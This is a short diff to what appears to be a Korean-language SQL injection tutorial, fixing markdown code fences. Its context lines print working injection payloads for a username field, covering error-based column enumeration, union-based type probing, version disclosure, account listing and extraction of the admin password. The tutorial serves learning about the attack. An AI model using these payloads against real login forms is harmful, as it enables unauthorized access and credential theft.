@@ -249,6 +249,7 @@ username : ' having 1=1--
 공격 2 필드명 알아내기 (group by)
 username : 'group by users.id having 1=1--
 ```
+```
 공격 3 필드 타입 알아내기 (union)
 username : ' union select sum(username) from users--
 ```
@@ -264,7 +265,7 @@ username : 'union select @@version,1,1,1--
 공격 6 계정 추출하기
 username : 'union select min(username), 1,1,1 from users where username > 'a'--
 ```
-``
+```
 공격 7 계정의 패스워드 알아내기
 username : 'union select password,1,1,1 from users where username = 'admin'--
 ```
